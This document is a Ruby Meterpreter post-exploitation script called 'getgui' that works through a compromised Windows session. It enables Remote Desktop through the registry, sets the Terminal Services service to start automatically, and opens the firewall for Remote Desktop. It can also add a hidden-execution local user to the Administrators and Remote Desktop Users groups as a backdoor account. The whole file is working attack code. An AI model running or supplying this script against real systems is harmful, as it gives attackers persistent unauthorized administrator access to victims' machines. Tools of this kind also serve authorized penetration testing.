#!/usr/bin/env ruby
#
#Meterpreter script for enabling Remote Desktop on Windows 2003, Windows Vista
#Windows 2008 and Windows XP targets using native windows commands.
#Provided by Carlos Perez at carlos_perez[at]darkoperator.com
#Verion: 0.1.1
#Note: Port Forwarding option provided by Natron at natron[at]invisibledenizen.org
#      We are still working in making this option more stable.
################## Variable Declarations ##################

session = client
@@exec_opts = Rex::Parser::Arguments.new(
		"-h" => [ false,  "Help menu."                        ],
		"-e" => [ false,  "Enable RDP only."  ],
		"-p" => [ true,  "The Password of the user to add."  ],
       		"-u" => [ true,  "The Username of the user to add."  ]
		)

def enablerd(session)
	key = 'HKLM\\System\\CurrentControlSet\\Control\\Terminal Server'
	root_key, base_key = session.sys.registry.splitkey(key)
	value = "fDenyTSConnections"
	begin
	open_key = session.sys.registry.open_key(root_key, base_key, KEY_READ)
	v = open_key.query_value(value)
	print_status "Enabling Remote Desktop"
	if v.data == 1 
		print_status "\tRDP is disabled enabling it ..."
		open_key = session.sys.registry.open_key(root_key, base_key, KEY_WRITE)
		open_key.set_value(value, session.sys.registry.type2str("REG_DWORD"), 0)
	else
		print_status "\tRDP is already enabled"
	end
	rescue::Exception => e
			print_status("The following Error was encountered: #{e.class} #{e}")
	end
		
end
def enabletssrv(session)
	tmpout = [ ]
	cmdout = []
	key2 = "HKLM\\SYSTEM\\CurrentControlSet\\Services\\TermService"
	root_key2, base_key2 = session.sys.registry.splitkey(key2)
	value2 = "Start"
	begin
	open_key = session.sys.registry.open_key(root_key2, base_key2, KEY_READ)
	v2 = open_key.query_value(value2)
	print_status "Setting Terminal Services service startup mode"
	if v2.data != 2
		print_status "\tThe Terminal Services service is not set to auto, changing it to auto ..."
		cmmds = [ 'sc config termservice start= auto', "sc start termservice", ]
		cmmds. each do |cmd|
			r = session.sys.process.execute(cmd, nil, {'Hidden' => true, 'Channelized' => true})
			while(d = r.channel.read)
				tmpout << d
			end
			cmdout << tmpout
			r.channel.close
			r.close
			end
	else
		print_status "\tTerminal Services service is already set to auto"
	end
	#Enabling Exception on the Firewall
	print_status "\tOpening port in local firewall if necessary"
	r = session.sys.process.execute('netsh firewall set service type = remotedesktop mode = enable', nil, {'Hidden' => true, 'Channelized' => true})
	while(d = r.channel.read)
		tmpout << d
	end
	cmdout << tmpout
	r.channel.close
	r.close
	rescue::Exception => e
			print_status("The following Error was encountered: #{e.class} #{e}")
	end
end
def addrdpusr(session, username, password)
	tmpout = [ ]
	cmdout = []
	print_status "Setting user account for logon"
	print_status "\tAdding User: #{username} with Password: #{password}"
	begin
	r = session.sys.process.execute("net user #{username} #{password} /add", nil, {'Hidden' => true, 'Channelized' => true})
	while(d = r.channel.read)
		tmpout << d
	end
	cmdout << tmpout
	r.channel.close
	r.close
	print_status "\tAdding User: #{username} to local group Remote Desktop Users"
	r = session.sys.process.execute("net localgroup \"Remote Desktop Users\" #{username} /add", nil, {'Hidden' => true, 'Channelized' => true})
	while(d = r.channel.read)
		tmpout << d
	end
	cmdout << tmpout
	r.channel.close
	r.close
	print_status "\tAdding User: #{username} to local group Administrators"
	r = session.sys.process.execute("net localgroup Administrators #{username} /add", nil, {'Hidden' => true, 'Channelized' => true})
	while(d = r.channel.read)
		tmpout << d
	end
	cmdout << tmpout
	r.channel.close
	r.close
	print_status "You can now login with the created user"
	rescue::Exception => e
			print_status("The following Error was encountered: #{e.class} #{e}")
	end
end

module PortForwardTracker
	def cleanup
		super

		if pfservice
			pfservice.deref
		end

	end
	attr_accessor :pfservice
end


def message
	print_status "Windows Remote Desktop Configuration Meterpreter Script by Darkoperator"
	print_status "Carlos Perez carlos_perez@darkoperator.com"
end
################## MAIN ##################
# Parsing of Options
usr = nil
pass = nil
lport = nil
enbl = nil
@@exec_opts.parse(args) { |opt, idx, val|
	case opt
		when "-u"
			usr = val
		when "-p"
			pass = val
		when "-h"
			print(
			"Windows Remote Desktop Enabler Meterpreter Script\n" +
			"Usage: getgui -u <username> -p <password> \n" +
			@@exec_opts.usage			
			)
			break
		when "-n"
			lport = val.to_i
		when "-e"
			enbl = 1
		end

}
if enbl == 1
	message
	enablerd(session)
	enabletssrv(session)

elsif usr!= nil && pass != nil
	message
	enablerd(session)
	enabletssrv(session)
	addrdpusr(session, usr, pass)

else
	print(
		"Windows Remote Desktop Enabler Meterpreter Script\n" +
		"Usage: getgui -u <username> -p <password> \n" +
		@@exec_opts.usage)
end

